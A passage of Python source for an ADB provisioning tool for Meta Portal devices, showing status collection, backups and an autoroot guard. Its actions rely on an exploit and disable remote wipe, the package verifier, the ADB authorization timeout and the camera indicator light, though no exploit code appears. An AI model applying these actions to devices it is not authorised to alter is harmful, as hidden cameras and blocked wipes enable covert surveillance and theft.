                    f"echo {AUTOROOT_GUARD_TOKEN} > "
                    f"{AUTOROOT_DISABLE_FLAG_REMOTE}",
                ],
                timeout=15,
            )
            if not self._autoroot_flag_present():
                raise ProvisionError(
                    "could not set the autoroot disable flag "
                    f"({AUTOROOT_DISABLE_FLAG_REMOTE}); refusing to "
                    "provision because a live autoroot session could "
                    "race this run"
                )
        self._autoroot_guard_prior = prior
        _autoroot_guard_depth = 1
        print(
            f"AUTOROOT_GUARD_ENGAGED prior={prior}"
            + (" leftover=1" if leftover else ""),
            flush=True,
        )

    def _release_autoroot_guard(self, succeeded: bool) -> None:
        global _autoroot_guard_depth
        if self._autoroot_guard_nested:
            self._autoroot_guard_nested = False
            _autoroot_guard_depth -= 1
            return
        prior = self._autoroot_guard_prior
        if prior is None:
            return
        self._autoroot_guard_prior = None
        _autoroot_guard_depth -= 1
        problem: str | None = None
        try:
            if prior == "absent":
                self.adb_run(
                    ["shell", "rm", "-f", AUTOROOT_DISABLE_FLAG_REMOTE],
                    timeout=15,
                )
                if self._autoroot_flag_present():
                    problem = "the disable flag is still present"
            else:
                if not self._autoroot_flag_present():
                    self.adb_run(
                        ["shell", "touch", AUTOROOT_DISABLE_FLAG_REMOTE],
                        timeout=15,
                    )
                if not self._autoroot_flag_present():
                    problem = (
                        "the pre-existing disable flag could not be "
                        "restored"
                    )
        except (ProvisionError, OSError) as exc:
            problem = f"device unreachable during restore ({exc})"
        if problem is None:
            print(f"AUTOROOT_GUARD_RESTORED prior={prior}", flush=True)
            return
        detail = (
            f"AUTOROOT_GUARD_RESTORE_FAILED prior={prior} "
            f"problem={problem}; the flag state the run found could "
            f"not be restored. If autoroot should be active, remove "
            f"{AUTOROOT_DISABLE_FLAG_REMOTE} on the device; if it "
            f"should stay off, create it."
        )
        if succeeded:
            raise ProvisionError(detail)
        print(detail, flush=True)

    @contextlib.contextmanager
    def bootstrap_guard(self, label: str):
        """Run one dedicated bootstrap phase of a multi-action run.

        A phase failure used to abort the whole run, leaving every later
        action unapplied (a failing Meta-account phase, for example, also
        blocked debloat, remote-wipe, presence and the main pass). In a
        multi-action run the failure is now recorded, the remaining phases
        still run, and report_deferred_failures() fails the run at the end.
        A run requesting only one action keeps the original fail-fast
        behaviour.
        """
        try:
            yield
        except ProvisionError as exc:
            requested = {
                name for name, enabled in self.requested_actions().items() if enabled
            }
            if len(requested) <= 1:
                raise
            self.deferred_phase_failures.append(f"{label}: {exc}")
            print(
                f"PHASE_FAILED phase={label} error={exc}; "
                "continuing with remaining actions",
                flush=True,
            )

    def report_deferred_failures(self) -> None:
        if self.deferred_phase_failures:
            raise ProvisionError(
                "bootstrap phases failed: "
                + "; ".join(self.deferred_phase_failures)
            )


    def requested_actions(self) -> dict[str, object]:
        actions: dict[str, object] = {}
        for name in (
            "persistent_wireless_adb",
            "disable_adb_auth_timeout",
            "restore_adb_auth_timeout",
            "audio",
            "restore_audio",
            "disable_updates",
            "enable_updates",
            "debloat",
            "restore_bloat",
            "block_remote_wipe",
            "restore_remote_wipe",
            "remove_meta_accounts",
            "optimize_presence",
            "restore_presence_profile",
            "restore_presence_fps",
            "dhcp_dns",
            "restore_privacy_dns",
            "allow_app_updates",
            "restore_app_verifier",
            "shizuku",
            "remove_shizuku",
            "disable_camera_light",
            "restore_camera_light",
        ):
            if getattr(self, name):
                actions[name] = True
        if self.privacy_dns:
            actions["privacy_dns"] = self.privacy_dns
        if self.presence_fps_cap is not None:
            actions["presence_fps_cap"] = self.presence_fps_cap
        if self.system_theme_control is not None:
            actions["system_theme_control"] = self.system_theme_control
        if self.custom_payload is not None:
            actions["custom_payload"] = str(self.custom_payload)
        return actions

    def tool_revision(self) -> str:
        return self.run_state.tool_revision()

    def selected_artifact_hashes(self) -> dict[str, str]:
        return self.run_state.artifact_hashes(
            self._selected_artifact_candidates()
        )

    def _selected_artifact_candidates(self) -> list[pathlib.Path]:
        candidates = [pathlib.Path(__file__).resolve(), ROOT / "tools/portal_targets.py"]
        if self.target:
            candidates.append(self.target.preload_path(ROOT))
        if self.privileged_requested() and self.uses_exploit_sentinel():
            candidates.append(EXPLOIT_SENTINEL_LOCAL)
        if self.audio:
            candidates.append(
                HELPER_JAVA_LOCAL
                if self.target and self.target.audio_java_fallback
                else HELPER_LOCAL
            )
            if self.target and self.target.audio_java_fallback:
                candidates.append(AUDIO_CTL_LOCAL)
        if self.remove_meta_accounts:
            candidates.append(ACCOUNT_CTL_LOCAL)
        if self.needs_component_ctl() or self.block_remote_wipe:
            candidates.append(COMPONENT_CTL_LOCAL)
        if self.shizuku:
            candidates.append(SHIZUKU_HELPER_LOCAL)
            if self.shizuku_apk:
                candidates.append(self.shizuku_apk)
        if self.needs_uid1000_payload():
            candidates.extend(
                (self.uid1000_helper_local(), self.uid1000_hook_local())
            )
            if self.target and self.target.uid1000_embedded_helper:
                candidates.append(UID1000_RUNTIME_APK_LOCAL)
        return candidates

    def read_state(self) -> dict[str, object] | None:
        return self.run_state.read_state()

    def write_state(
        self,
        state_status: str,
        first_boot: str | None = None,
        second_boot: str | None = None,
    ) -> None:
        fingerprint = self.adb_run(
            ["shell", "getprop", "ro.build.fingerprint"], timeout=5, check=True
        ).stdout.strip()
        self.run_state.write_state(
            state_status,
            fingerprint=fingerprint,
            target_key=self.target.key if self.target else None,
            tool_revision=self.tool_revision(),
            artifact_sha256=self.selected_artifact_hashes(),
            actions=self.requested_actions(),
            first_boot=first_boot,
            second_boot=second_boot,
        )

    @staticmethod
    def presence_full_scene_active(
        logs: str, camera: str, target: PortalTarget | None
    ) -> bool:
        return presence_full_scene_active(logs, camera, target)

    def collect_status(self) -> dict[str, object]:
        def shell(*arguments: str, timeout: int = 15) -> str:
            return self.adb_run(
                ["shell", *arguments], timeout=timeout
            ).stdout.strip()

        def exists(path: str) -> bool:
            return self.adb_run(
                ["shell", "test", "-f", path], timeout=5
            ).returncode == 0

        fingerprint = shell("getprop", "ro.build.fingerprint", timeout=5)
        device = shell("getprop", "ro.product.device", timeout=5)
        product_model = shell("getprop", "ro.product.model", timeout=5)
        target = find_target(device, fingerprint, product_model)
        uid1000_host_package = (
            target.uid1000_host_package
            if target
            else DEFAULT_UID1000_HOST_PACKAGE
        )
        ota_packages = (
            target.ota_packages
            if target
            else (OTA_UI_PACKAGE, OTA_SETUP_PACKAGE)
        )
        disabled_output = shell("pm", "list", "packages", "-d", "-u")
        disabled = {
            line.removeprefix("package:").strip()
            for line in disabled_output.splitlines()
            if line.startswith("package:")
        }
        installed_output = shell("pm", "list", "packages")
        installed = {
            line.removeprefix("package:").strip()
            for line in installed_output.splitlines()
            if line.startswith("package:")
        }
        logs = shell(
            "logcat",
            "-d",
            "-b",
            "main",
            "-t",
            "10000",
            "-v",
            "brief",
            "-e",
            PRESENCE_LOGCAT_REGEX,
            timeout=20,
        )
        connectivity = shell("dumpsys", "connectivity", timeout=20)
        audio_logs = shell(
            "logcat",
            "-d",
            "-b",
            "main",
            "-s",
            "PortalAudioPersist:*",
            timeout=10,
        )
        audio_disabled_observed = self.audio_processing_disabled_observed(
            audio_logs, target
        )
        mha_audio_observed = MHA_AUDIO_VERIFIED_LOG in audio_logs
        camera_light_logs = shell(
            "logcat",
            "-d",
            "-t",
            "10000",
            "-s",
            "PortalCameraLed:*",
            timeout=10,
        )
        camera = shell("dumpsys", "media.camera", timeout=20)
        webview = shell("dumpsys", "webviewupdate", timeout=15)
        accounts = self.meta_accounts()
        authenticators = self.disabled_meta_authenticators()
        ota_dump = shell("dumpsys", "facebook.aloha.otaservice", timeout=15)
        private_dns_mode = shell("settings", "get", "global", "private_dns_mode")
        private_dns_host = shell(
            "settings", "get", "global", "private_dns_specifier"
        )
        active_dns: list[str] = []
        validated_private_dns: list[str] = []
        search_domains: str | None = None
        for line in connectivity.splitlines():
            if (
                "NetworkAgentInfo{" not in line
                or "state: CONNECTED/CONNECTED" not in line
                or "DnsAddresses: [" not in line
            ):
                continue
            match = re.search(r"DnsAddresses: \[\s*([^]]*?)\s*\]", line)
            if match:
                active_dns = [
                    address.strip().lstrip("/")
                    for address in match.group(1).split(",")
                    if address.strip()
                ]
            match = re.search(
                r"ValidatedPrivateDnsAddresses: \[\s*([^]]*?)\s*\]", line
            )
            if match:
                validated_private_dns = [
                    address.strip().lstrip("/")
                    for address in match.group(1).split(",")
                    if address.strip()
                ]
            match = re.search(r"Domains: (\S+)", line)
            if match and match.group(1) != "null":
                search_domains = match.group(1)
            break
        fallback_dns_match = re.search(
            r"defaultIPv4DNS:\s*\[([^]]*)\]", connectivity
        )
        fallback_dns = (
            [
                address.strip().lstrip("/")
                for address in fallback_dns_match.group(1).split(",")
                if address.strip()
            ]
            if fallback_dns_match
            else []
        )
        manifest: object
        try:
            manifest = self.read_state()
        except ProvisionError as exc:
            manifest = {"error": str(exc)}
        profile_keys = sorted(
            key
            for key, expected in PRESENCE_PROFILE_SETTINGS.items()
            if any(
                "settings_config.xml" in line
                and key in line
                and re.search(
                    rf"\b{str(expected).lower()}\b", line, re.IGNORECASE
                )
                for line in logs.splitlines()
            )
        )
        required_profile_keys = set(
            target.presence_runtime_keys
            if target and target.presence_runtime_keys
            else PRESENCE_PROFILE_KEYS
        )
        audio_installed = exists(
            "/data/local/tmp/portal-audio-backup/installed-v1"
        )
        audio_restored = exists(
            "/data/local/tmp/portal-audio-backup/restored-v1"
        )
        ota_installed = exists("/data/local/tmp/portal-ota-backup/installed-v1")
        ota_restored = exists("/data/local/tmp/portal-ota-backup/restored-v1")
        presence_installed = exists(PRESENCE_INSTALLED_REMOTE)
        presence_restored = exists(
            "/data/local/tmp/portal-presence-backup/restored-v1"
        )
        presence_fps_installed = exists(
            "/data/local/tmp/portal-presence-backup/fps-cap-v1"
        )
        presence_fps_restored = exists(
            "/data/local/tmp/portal-presence-backup/fps-restored-v1"
        )
        presence_fps_value = shell(
            "cat", "/data/local/tmp/portal-presence-backup/fps-cap-v1", timeout=5
        )
        applied_fps_match = re.search(
            r"Setting AI Processing FPS\s+([0-9]+(?:\.[0-9]+)?)", logs
        )
        component_backup = self.read_component_backup(required=False)
        component_states = (
            self.current_component_states() if component_backup is not None else {}
        )
        target_component_names = self.debloat_component_names()
        unexpected_disabled_components = (
            self.unexpected_disabled_debloat_components(
                component_backup, component_states
            )
            if component_backup is not None
            else []
        )
        component_disabled = sum(
            1
            for component in target_component_names
            if component in component_states
            and component_states[component][1] == "disabled"
            and component not in SELF_MANAGED_DEBLOAT_COMPONENTS
        )
        remote_wipe_backup = self.read_remote_wipe_backup(required=False)
        remote_wipe_states = self.current_named_component_states(
            REMOTE_WIPE_COMPONENTS, detect_missing=True
        )
        remote_wipe_present = sum(
            state != "absent" for state in remote_wipe_states.values()
        )
        remote_wipe_disabled = sum(
            state == "disabled" for state in remote_wipe_states.values()
        )
        presence_helper_dump = shell("dumpsys", "package", PRESENCE_HELPER_PACKAGE)
        presence_uid1000_configured = exists(self.uid1000_path("presence-fps"))
        presence_uid1000_fps = shell(
            "cat", self.uid1000_path("presence-fps"), timeout=5
        )
        if target and target.uid1000_embedded_helper:
            presence_uid1000_configured = presence_fps_installed
            presence_uid1000_fps = presence_fps_value
        shizuku_dump = shell("dumpsys", "package", SHIZUKU_PACKAGE)
        shizuku_version = re.search(r"\bversionName=([^\s]+)", shizuku_dump)
        package_verifier_setting = shell(
            "settings", "get", "global", "package_verifier_enable", timeout=5
        )
        adb_auth_timeout = shell(
            "settings", "get", "global", ADB_AUTH_TIMEOUT_SETTING, timeout=5
        )
        adb_enabled = shell(
            "settings", "get", "global", ADB_ENABLED_SETTING, timeout=5
        )
        process_list = shell("ps", "-A", "-o", "USER,PID,PPID,NAME,ARGS")
        shizuku_process = next(
            (line for line in process_list.splitlines() if "shizuku_server" in line),
            "",
        )
        camera_light_process = next(
            (
                line
                for line in process_list.splitlines()
                if "portal-camera-led-watch" in line
                or "portal-led-watc" in line
            ),
            "",
        )
        camera_light_host_process = next(
            (
                line
                for line in process_list.splitlines()
                if uid1000_host_package in line
            ),
            "",
        )
        camera_light_installed = exists(CAMERA_LIGHT_INSTALLED_REMOTE)
        private_uid1000_runtime = bool(
            target and target.uid1000_embedded_helper
        )
        camera_light_configured = (
            camera_light_installed
            if private_uid1000_runtime
            else exists(self.uid1000_path("camera-led-enabled"))
        )
        camera_light_watchdog_running = bool(
            camera_light_process and camera_light_configured
        )
        system_theme_value = shell(
            "settings", "get", "secure", SYSTEM_THEME_SETTING, timeout=5
        )
        system_theme_request = shell(
            "getprop", SYSTEM_THEME_PROPERTY, timeout=5
        )
        system_theme_control_configured = exists(
            self.uid1000_path(SYSTEM_THEME_CONTROL_MARKER)
        )
        return {
            "schema": 1,
            "serial": self.serial,
            "target": {
                "supported": target is not None,
                "key": target.key if target else None,
                "model": product_model,
                "device": device,
                "fingerprint": fingerprint,
            },
            "runtime": {
                "boot_id": shell("cat", "/proc/sys/kernel/random/boot_id", timeout=5),
                "selinux": shell("getenforce", timeout=5),
                "wireless_adb_property": (
                    target.wireless_adb_file_property
                    if target and target.wireless_adb_file_property
                    else "persist.adb.tcp.port"
                ),
                "wireless_adb_port": shell(
                    "getprop",
                    (
                        target.wireless_adb_file_property
                        if target and target.wireless_adb_file_property
                        else "persist.adb.tcp.port"
                    ),
                    timeout=5,
                ),
                "wireless_adb_persistence_verified": exists(
                    WIRELESS_ADB_INSTALLED_REMOTE
                ),
                "adb_framework_boot_persistence_verified": exists(
                    ADB_FRAMEWORK_BOOT_INSTALLED_REMOTE
                ),
                "adb_auth_allowed_connection_time_ms": (
                    int(adb_auth_timeout)
                    if adb_auth_timeout.isdigit()
                    else None
                ),
                "adb_auth_timeout_disabled": adb_auth_timeout == "0",
                "adb_auth_timeout_backup_present": exists(
                    ADB_AUTH_TIMEOUT_BACKUP_REMOTE
                ),
                "adb_enabled_setting": (
                    int(adb_enabled) if adb_enabled in {"0", "1"} else None
                ),
                "adb_authorization_prompts_enabled": adb_enabled == "1",
                "aiservice_pid": shell(
                    "pidof", "com.facebook.portal.aiservice", timeout=5
                ),
                "cameras": 2 if "Number of camera devices: 2" in camera else None,
                "webview_ready": "(com.facebook.portal.webview," in webview,
            },
            "audio": {
                "state": (
                    "installed"
                    if audio_installed
                    or (
                        target is not None
                        and target.audio_installer_credentials
                        and audio_disabled_observed
                    )
                    else "restored"
                    if audio_restored
                    else "observed_this_boot"
                    if "persistent audio watchdog started" in audio_logs
                    else "unknown"
                ),
                "installed_marker": audio_installed,
                "watchdog_observed": (
                    "persistent audio watchdog started" in audio_logs
                    or audio_disabled_observed
                ),
                "processing_zero_observed": audio_disabled_observed,
                "mha_processing_verified": mha_audio_observed,
                "backend": (
                    "mha"
                    if target is not None and target.device == "omni"
                    else "voice-param"
                    if target is not None
                    else None
                ),
                "restored_marker": audio_restored,
            },
            "updates": {
                "state": (
                    "blocked"
                    if ota_installed
                    or (
                        all(
                            package in disabled
                            for package in ota_packages
                        )
                        and "getBool(kFirmwareOtaUpdateEnable): false" in ota_dump
                    )
                    else "restored"
                    if ota_restored
                    else "unknown"
                ),
                "installed_marker": ota_installed,
                "packages_disabled": all(
                    package in disabled
                    for package in ota_packages
                ),
                "firmware_gate_false": (
                    "getBool(kFirmwareOtaUpdateEnable): false" in ota_dump
                ),
                "restored_marker": ota_restored,
            },
            "debloat": {
                "disabled": sorted(set(DEBLOAT_PACKAGES) & disabled),
                "components_disabled": component_disabled,
                "component_profile": (
                    target.debloat_component_profile if target else "full"
                ),
                "components_targeted": len(target_component_names),
                "unexpected_components_disabled": len(
                    unexpected_disabled_components
                ),
                "requires_restore": bool(unexpected_disabled_components),
                "components_retained_self_managed": sorted(
                    SELF_MANAGED_DEBLOAT_COMPONENTS
                ),
                "component_backup_present": component_backup is not None,
                "package_profile_complete": all(
                    package not in installed or package in disabled
                    for package in DEBLOAT_PACKAGES
                ),
                "component_profile_complete": component_backup is not None
                and not unexpected_disabled_components
                and all(
                    component_backup[component][1] == "absent"
                    or component in SELF_MANAGED_DEBLOAT_COMPONENTS
                    or component_states[component][1] == "disabled"
                    for component in target_component_names
                ),
                "complete": all(
                    package not in installed or package in disabled
                    for package in DEBLOAT_PACKAGES
                )
                and component_backup is not None
                and not unexpected_disabled_components
                and all(
                    component_backup[component][1] == "absent"
                    or component in SELF_MANAGED_DEBLOAT_COMPONENTS
                    or component_states[component][1] == "disabled"
                    for component in target_component_names
                ),
            },
            "remote_wipe": {
                "state": (
                    "blocked"
                    if remote_wipe_present == remote_wipe_disabled
                    else "restored"
                    if remote_wipe_backup is not None
                    and all(
                        original == "absent"
                        or remote_wipe_states[component] == original
                        for component, original in remote_wipe_backup.items()
                    )
                    else "enabled"
                ),
                "backup_present": remote_wipe_backup is not None,
                "receivers_targeted": len(REMOTE_WIPE_COMPONENTS),
                "receivers_present": remote_wipe_present,
                "receivers_disabled": remote_wipe_disabled,
                "components": remote_wipe_states,
            },
            "meta_accounts": {
                "remaining": len(accounts),
                "authenticators_disabled": len(
                    set(META_AUTHENTICATOR_COMPONENTS) & authenticators
                ),
            },
            "presence": {
                "state": (
                    "optimized"
                    if presence_installed
                    or required_profile_keys.issubset(profile_keys)
                    else "restored"
                    if presence_restored
                    else "unknown"
                ),
                "installed_marker": presence_installed,
                "restored_marker": presence_restored,
                "analysis_fps_cap_installed": presence_fps_installed,
                "analysis_fps_cap_restored": presence_fps_restored,
                "analysis_fps_cap": (
                    int(presence_fps_value)
                    if presence_fps_value.isdigit()
                    else None
                ),
                "analysis_fps_applied_this_boot": (
                    float(applied_fps_match.group(1))
                    if applied_fps_match
                    else None
                ),
                "analysis_fps_helper_installed": (
                    presence_uid1000_configured
                    or f"Package [{PRESENCE_HELPER_PACKAGE}]" in presence_helper_dump
                ),
                "analysis_fps_helper_key_authorized": exists(
                    PRESENCE_SAVED_KEY_REMOTE
                ),
                "analysis_fps_activation_host": (
                    "uid1000"
                    if presence_uid1000_configured
                    else "loopback_adb"
                    if f"Package [{PRESENCE_HELPER_PACKAGE}]" in presence_helper_dump
                    else None
                ),
                "analysis_fps_uid1000_configured": presence_uid1000_configured,
                "analysis_fps_uid1000_value": (
                    int(presence_uid1000_fps)
                    if presence_uid1000_fps.isdigit()
                    else None
                ),
                "analysis_fps_legacy_helper_installed": (
                    f"Package [{PRESENCE_HELPER_PACKAGE}]" in presence_helper_dump
                ),
                "analysis_fps_legacy_key_authorized": exists(
                    PRESENCE_SAVED_KEY_REMOTE
                ),
                "profile_keys_loaded": profile_keys,
                "full_scene_profile": self.presence_full_scene_active(
                    logs, camera, target
                ),
                "analysis_frames_observed": PRESENCE_ANALYSIS_FRAME_MARKER in logs,
                "roi_frames_observed": PRESENCE_ROI_FRAME_MARKER in logs,
                "presence_event_observed": PRESENCE_LOG_MARKER in logs,
            },
            "privacy_dns": {
                "mode": None if private_dns_mode == "null" else private_dns_mode,
                "hostname": None if private_dns_host == "null" else private_dns_host,
                "strategy": (
                    "strict"
                    if private_dns_mode == "hostname"
                    else "network"
                    if private_dns_mode == "off"
                    else "automatic"
                ),
                "active_servers": active_dns,
                "validated_private_servers": validated_private_dns,
                "search_domains": search_domains,
                "fallback_ipv4_servers": fallback_dns,
                "backup_present": self.adb_run(
                    ["shell", "test", "-f", PRIVACY_BACKUP_REMOTE], timeout=5
                ).returncode
                == 0,
            },
            "app_updates": {
                "meta_verifier_package_enabled": (
                    APP_VERIFIER_PACKAGE in installed
                    and APP_VERIFIER_PACKAGE not in disabled
                ),
                "package_verifier_setting": (
                    None
                    if package_verifier_setting == "null"
                    else package_verifier_setting
                ),
                "third_party_updates_allowed": (
                    package_verifier_setting == "0"
                    or APP_VERIFIER_PACKAGE in disabled
                ),
                "backup_present": exists(APP_VERIFIER_BACKUP_REMOTE),
            },
            "shizuku": {
                "installed": SHIZUKU_PACKAGE in installed,
                "version_name": (
                    shizuku_version.group(1) if shizuku_version else None
                ),
                "boot_helper_installed": SHIZUKU_HELPER_PACKAGE in installed,
                "key_authorized_by_provisioner": exists(SHIZUKU_SAVED_KEY_REMOTE),
                "server_running": bool(shizuku_process),
                "server_user": (
                    shizuku_process.split()[0] if shizuku_process else None
                ),
            },
            "system_theme_control": {
                "mode": (
                    "light"
                    if system_theme_value == "1"
                    else "dark"
                    if system_theme_value == "2"
                    else "auto"
                    if system_theme_value == "0"
                    else None
                ),
                "setting_value": (
                    int(system_theme_value)
                    if system_theme_value.isdigit()
                    else None
                ),
                "runtime_request": (
                    system_theme_request
                    if system_theme_request in {"light", "dark"}
                    else None
                ),
                "uid1000_required": bool(
                    target and target.system_theme_uid1000_required
                ),
                "uid1000_control_configured": (
                    system_theme_control_configured
                ),
                "helper_running": bool(camera_light_process),
            },
            "camera_light": {
                "state": (
                    "installed"
                    if camera_light_installed
                    else "restored"
                    if exists(CAMERA_LIGHT_RESTORED_REMOTE)
                    else "unknown"
                ),
                "installed_marker": exists(CAMERA_LIGHT_INSTALLED_REMOTE),
                "restored_marker": exists(CAMERA_LIGHT_RESTORED_REMOTE),
                "feature_config_present": camera_light_configured,
                "helper_present": (
                    bool(camera_light_process)
                    if private_uid1000_runtime
                    else exists(self.uid1000_path("portal-camera-led-watch"))
                ),
                "helper_running": bool(camera_light_process),
                "helper_user": (
                    camera_light_process.split()[0]
                    if camera_light_process
                    else None
                ),
                "watchdog_running": camera_light_watchdog_running,
                "watchdog_user": (
                    camera_light_process.split()[0]
                    if camera_light_watchdog_running
                    else None
                ),
                "persistent_host_running": bool(camera_light_host_process),
                "persistent_host_package": uid1000_host_package,
                "connected_this_boot": (
                    "watchdog connected uid=1000" in camera_light_logs
                ),
                "camera_capture_compatible": not camera_light_configured,
                "warning": (
                    "The legacy LED watchdog causes Meta's camera provider "
                    "to reject capture requests. Run --restore-camera-light."
                    if camera_light_configured
                    else None
                ),
            },
            "provision_manifest": manifest,
        }

    def print_status(self) -> dict[str, object]:
        status = self.collect_status()
        rendered = json.dumps(status, indent=2, sort_keys=True)
        print(rendered)
        self.log_dir.mkdir(parents=True, exist_ok=True)
        (self.log_dir / "status.json").write_text(rendered + "\n")
        return status

    def privileged_requested(self) -> bool:
        return any(
            (
                self.persistent_wireless_adb,
                self.wireless_adb_only,
                self.adb_framework_only,
                self.audio,
                self.restore_audio,
                self.disable_updates,
                self.enable_updates,
                self.debloat,
                self.restore_bloat,
                self.block_remote_wipe,
                self.restore_remote_wipe,
                self.remove_meta_accounts,
                self.optimize_presence,
                self.restore_presence_profile,
                self.presence_fps_cap is not None,
                self.restore_presence_fps,
                self.shizuku,
                self.remove_shizuku,
                self.disable_camera_light,
                self.restore_camera_light,
                self.custom_payload is not None,
                self.system_theme_uid1000_action_requested(),
            )
        )

    def uses_exploit_sentinel(self) -> bool:
        return self.target is None or self.target.proc_uid_sentinel != "thread"

    def dry_run_report(self, status: dict[str, object]) -> None:
        actions = self.requested_actions()
        audio = status.get("audio", {})
        updates = status.get("updates", {})
        debloat = status.get("debloat", {})
        remote_wipe = status.get("remote_wipe", {})
        accounts = status.get("meta_accounts", {})
        presence = status.get("presence", {})
        privacy = status.get("privacy_dns", {})
        app_updates = status.get("app_updates", {})
        shizuku = status.get("shizuku", {})
        system_theme = status.get("system_theme_control", {})
        camera_light = status.get("camera_light", {})
        runtime = status.get("runtime", {})
        current = {
            "audio": audio.get("state") if isinstance(audio, dict) else None,
            "updates": updates.get("state") if isinstance(updates, dict) else None,
            "debloat": debloat.get("complete") if isinstance(debloat, dict) else None,
            "remote_wipe": (
                remote_wipe.get("state")
                if isinstance(remote_wipe, dict)
                else None
            ),
            "meta_accounts_remaining": (
                accounts.get("remaining") if isinstance(accounts, dict) else None
            ),
            "presence": presence.get("state") if isinstance(presence, dict) else None,
            "privacy_dns": privacy if isinstance(privacy, dict) else None,
            "app_updates": app_updates if isinstance(app_updates, dict) else None,
            "shizuku": shizuku if isinstance(shizuku, dict) else None,
            "system_theme_control": (
                system_theme if isinstance(system_theme, dict) else None
            ),
            "camera_light": (
                camera_light if isinstance(camera_light, dict) else None
            ),
            "adb_auth_timeout_disabled": (
                runtime.get("adb_auth_timeout_disabled")
                if isinstance(runtime, dict)
                else None
            ),
            "adb_authorization_prompts_enabled": (
                runtime.get("adb_authorization_prompts_enabled")
                if isinstance(runtime, dict)
                else None
            ),
            "adb_framework_boot_persistence_verified": (
                runtime.get("adb_framework_boot_persistence_verified")
                if isinstance(runtime, dict)
                else None
            ),
        }
        required_outputs = []
        if self.target and self.privileged_requested():
            required_outputs.append(str(self.target.preload_path(ROOT)))
        if self.privileged_requested() and self.uses_exploit_sentinel():
            required_outputs.append(str(EXPLOIT_SENTINEL_LOCAL))
        if self.audio:
            required_outputs.append(str(HELPER_LOCAL))
        if self.remove_meta_accounts:
            required_outputs.append(str(ACCOUNT_CTL_LOCAL))
        if self.needs_component_ctl():
            required_outputs.append(str(COMPONENT_CTL_LOCAL))
        if self.shizuku:
            required_outputs.append(str(SHIZUKU_HELPER_LOCAL))
        if self.needs_uid1000_payload():
            required_outputs.extend(
                (str(self.uid1000_helper_local()), str(self.uid1000_hook_local()))
            )
            if self.target and self.target.uid1000_embedded_helper:
                required_outputs.append(str(UID1000_RUNTIME_APK_LOCAL))
        report = {
            "actions": actions,
            "current": current,
            "requires_exploit": self.privileged_requested(),
            "minimum_reboots": (
                3
                if self.privileged_requested()
                else 0
                if set(actions) <= {
                    "disable_adb_auth_timeout",
                    "restore_adb_auth_timeout",
                    "system_theme_control",
                }
                else 2
            ),
            "host_tools": {
                name: shutil.which(name) is not None
                for name in ("adb", "git", "make", "python3")
            },
            "build_outputs": {
                path: pathlib.Path(path).is_file() for path in required_outputs
            },
            "will_modify_device": False,
        }
        print("DRY_RUN " + json.dumps(report, sort_keys=True))

    def create_backup_bundle(self, destination: pathlib.Path) -> pathlib.Path:
        if destination.suffixes[-2:] != [".tar", ".gz"]:
            destination.mkdir(parents=True, exist_ok=True)
            destination = destination / (
                "portal-backup-" + dt.datetime.now().strftime("%Y%m%d-%H%M%S") + ".tar.gz"
            )
        else:
            destination.parent.mkdir(parents=True, exist_ok=True)
        with tempfile.TemporaryDirectory(prefix="portal-backup-") as temporary:
            root = pathlib.Path(temporary) / "portal-backup"
            root.mkdir()
            status = self.collect_status()
            (root / "status.json").write_text(
                json.dumps(status, indent=2, sort_keys=True) + "\n"
            )
            commands = {
                "getprop.txt": ["shell", "getprop"],
                "packages.txt": ["shell", "dumpsys", "package", "packages"],
                "device-policy.txt": ["shell", "dumpsys", "device_policy"],
                "accounts.txt": ["shell", "dumpsys", "account"],
                "ota.txt": ["shell", "dumpsys", "facebook.aloha.otaservice"],
                "webview.txt": ["shell", "dumpsys", "webviewupdate"],
            }
            for filename, arguments in commands.items():
                result = self.adb_run(arguments, timeout=30)
                (root / filename).write_text(result.stdout, errors="replace")
            device_files = root / "device-files"
            device_files.mkdir()
            for remote in (
                STATE_REMOTE,
                DEBLOAT_BACKUP_REMOTE,
                DEBLOAT_COMPONENT_BACKUP_REMOTE,
                REMOTE_WIPE_BACKUP_REMOTE,
                META_ACCOUNT_BACKUP_REMOTE,
                PRIVACY_BACKUP_REMOTE,
                ADB_AUTH_TIMEOUT_BACKUP_REMOTE,
                APP_VERIFIER_BACKUP_REMOTE,
                "/data/local/tmp/portal-ota-backup",
                "/data/local/tmp/portal-presence-backup",
                "/data/local/tmp/portal-device-owner-backup",
                "/data/local/tmp/portal-audio-backup",
                "/data/local/tmp/portal-audio-snapshot",
            ):
                self.adb_run(
                    ["pull", remote, str(device_files)], timeout=30
                )
            manifest = {
                "schema": 1,
                "created_at": dt.datetime.now(dt.timezone.utc).isoformat(),
                "serial": self.serial,
                "tool_revision": self.tool_revision(),
                "sha256": {},
            }
            hashes = manifest["sha256"]
            assert isinstance(hashes, dict)
            for path in sorted(root.rglob("*")):
                if path.is_file():
                    hashes[str(path.relative_to(root))] = hashlib.sha256(
                        path.read_bytes()
                    ).hexdigest()
            (root / "manifest.json").write_text(
                json.dumps(manifest, indent=2, sort_keys=True) + "\n"
            )
            with tarfile.open(destination, "w:gz") as archive:
                archive.add(root, arcname="portal-backup")
        destination.chmod(0o600)
        print(f"BACKUP_OK path={destination}")
        return destination

    def backup_private_dns(self) -> None:
        return self.settings_feature.backup_private_dns()

    def verify_adb_framework_enabled(
        self, action: str = "verified", wait_seconds: int = 0
    ) -> None:
        deadline = time.monotonic() + wait_seconds
        while True:
            actual = self.adb_run(
                ["shell", "settings", "get", "global", ADB_ENABLED_SETTING],
                timeout=5,
                check=True,
            ).stdout.strip()
            if actual == "1" or time.monotonic() >= deadline:
                break
            time.sleep(3)
        if actual != "1":
            raise ProvisionError(
                "Android's ADB framework is disabled, so new host "
                "authorization prompts cannot appear: "
                f"{ADB_ENABLED_SETTING}={actual!r}"
            )
        print(
            f"ADB_FRAMEWORK_OK action={action} "
            f"{ADB_ENABLED_SETTING}={actual} prompts=enabled"
        )

    def ensure_adb_framework_enabled(self) -> None:
        before = self.adb_run(
            ["shell", "settings", "get", "global", ADB_ENABLED_SETTING],
            timeout=5,
            check=True,
        ).stdout.strip()
        if before != "1":
            self.adb_run(
                [
                    "shell",
                    "settings",
                    "put",
                    "global",
                    ADB_ENABLED_SETTING,
                    "1",
                ],
                timeout=10,
                check=True,
            )
        self.verify_adb_framework_enabled(
            action="already-enabled" if before == "1" else "enabled"
        )

    def backup_adb_auth_timeout(self) -> None:
        existing = self.adb_run(
            ["shell", "cat", ADB_AUTH_TIMEOUT_BACKUP_REMOTE], timeout=5
        )
        if existing.returncode == 0:
            self.read_adb_auth_timeout_backup()
            return
        original = self.adb_run(
            ["shell", "settings", "get", "global", ADB_AUTH_TIMEOUT_SETTING],
            timeout=5,
            check=True,
        ).stdout.strip()
